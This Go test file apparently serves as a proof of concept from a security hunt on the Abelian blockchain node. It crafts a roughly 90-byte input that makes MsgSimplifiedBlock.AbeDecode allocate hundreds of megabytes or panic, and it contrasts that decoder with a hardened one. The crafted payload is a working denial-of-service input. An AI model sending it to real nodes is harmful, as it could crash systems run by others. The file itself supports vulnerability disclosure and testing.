// PoC for Abelian hunt area (b) abec-p2p-rpc — CANDIDATE 2.
//
// Claim: wire.MsgSimplifiedBlock.AbeDecode (wire/msgblock.go) allocates
// `make([]chainhash.Hash, txCount)` directly from an attacker-controlled
// varint with NO upper-bound check and NO checkDecodeSize call — unlike every
// other block/tx decoder hardened for ABEL-004 (MsgBlockAbe.BtcDecode caps at
// maxTxPerBlockAbe and calls checkDecodeSize before allocating).
// A ~90-byte input therefore forces a multi-hundred-MB allocation before any
// tx data is read, and a huge count panics the decoding goroutine
// ("makeslice: len out of range").
//
// Reachability: AbeDecode is reached via abeutil.NewSimplifiedBlockFromBytes,
// called only by the `submitsimplifiedblock` RPC handler, which is NOT in
// rpcLimited, so it requires ADMIN RPC credentials. Severity is therefore
// Low (trusted-admin-only), but the missing bound is real and the ABEL-004
// fix demonstrably missed this decode path.
package wire

import (
	"bytes"
	"runtime"
	"testing"
)

// simplifiedBlockPrefix builds the smallest input that reaches the txCount
// allocation: an 80-byte zero block header (version 0) + coinbaseExist=0.
func simplifiedBlockPrefix(txCount uint64) []byte {
	buf := make([]byte, 0, 100)
	buf = append(buf, make([]byte, 80)...) // version 0 header, all zero
	buf = append(buf, 0x00)                // coinbaseExist varint = 0
	// Encode txCount as a bitcoin varint (not Go uvarint).
	buf = appendVarInt(buf, txCount)
	return buf
}

func appendVarInt(buf []byte, val uint64) []byte {
	switch {
	case val < 0xfd:
		return append(buf, byte(val))
	case val <= 0xffff:
		b := []byte{0xfd, byte(val), byte(val >> 8)}
		return append(buf, b...)
	case val <= 0xffffffff:
		b := []byte{0xfe, byte(val), byte(val >> 8), byte(val >> 16), byte(val >> 24)}
		return append(buf, b...)
	default:
		b := []byte{0xff, byte(val), byte(val >> 8), byte(val >> 16), byte(val >> 24),
			byte(val >> 32), byte(val >> 40), byte(val >> 48), byte(val >> 56)}
		return append(buf, b...)
	}
}

func heapAllocMB() uint64 {
	runtime.GC()
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	return m.HeapAlloc / (1024 * 1024)
}

// heapAllocNoGC reads heap usage without forcing a GC, so a slice that is
// still reachable is not collected before the measurement.
func heapAllocNoGC() uint64 {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	return m.HeapAlloc / (1024 * 1024)
}

func TestPOCSimplifiedBlockUnboundedAlloc(t *testing.T) {
	// 5,000,000 claimed tx hashes * 32 bytes = ~160 MB allocated from a
	// 90-byte input, before a single tx hash is read (input then ends: EOF).
	const txCount = 5000000
	before := heapAllocMB()
	msg := &MsgSimplifiedBlock{}
	err := msg.AbeDecode(bytes.NewReader(simplifiedBlockPrefix(txCount)), 0, WitnessEncoding)
	after := heapAllocNoGC()
	_ = len(msg.Transactions) // keep the 160MB slice reachable through the measurement
	if err == nil {
		t.Fatal("expected decode error (truncated input), got nil")
	}
	grew := int64(after) - int64(before)
	t.Logf("AbeDecode(txCount=%d): err=%v heapAlloc %dMB -> %dMB (delta %+dMB)", txCount, err, before, after, grew)
	if grew < 100 {
		t.Fatalf("expected >=100MB heap growth from unbounded txCount alloc, got %+dMB", grew)
	}

	// Control: MsgBlockAbe.BtcDecode with the same claimed txCount rejects
	// without allocating (checkDecodeSize sees 0 bytes remaining). Note the
	// control input has no coinbaseExist byte: a block header followed
	// directly by the txCount varint.
	before = heapAllocMB()
	blk := &MsgBlockAbe{}
	blkPrefix := append(make([]byte, 0, 100), make([]byte, 80)...)
	blkPrefix = appendVarInt(blkPrefix, txCount)
	err = blk.BtcDecode(bytes.NewReader(blkPrefix), 0, WitnessEncoding)
	after = heapAllocMB()
	grew = int64(after) - int64(before)
	t.Logf("MsgBlockAbe.BtcDecode(txCount=%d): err=%v heapAlloc delta %+dMB", txCount, err, grew)
	if err == nil {
		t.Fatal("expected MsgBlockAbe decode error, got nil")
	}
	if grew > 50 {
		t.Fatalf("control: MsgBlockAbe allocated %+dMB, expected ~0", grew)
	}
}

func TestPOCSimplifiedBlockHugeCountPanics(t *testing.T) {
	// txCount = 2^44 claims 2^49 bytes (> maxAlloc), so make() must panic
	// with "makeslice: len out of range" instead of returning an error,
	// crashing the decoding goroutine.
	defer func() {
		if r := recover(); r == nil {
			t.Fatal("expected panic from unguarded make([]chainhash.Hash, 2^44), got none")
		} else {
			t.Logf("AbeDecode(txCount=2^44) panicked as expected: %v", r)
		}
	}()
	msg := &MsgSimplifiedBlock{}
	_ = msg.AbeDecode(bytes.NewReader(simplifiedBlockPrefix(1<<44)), 0, WitnessEncoding)
}
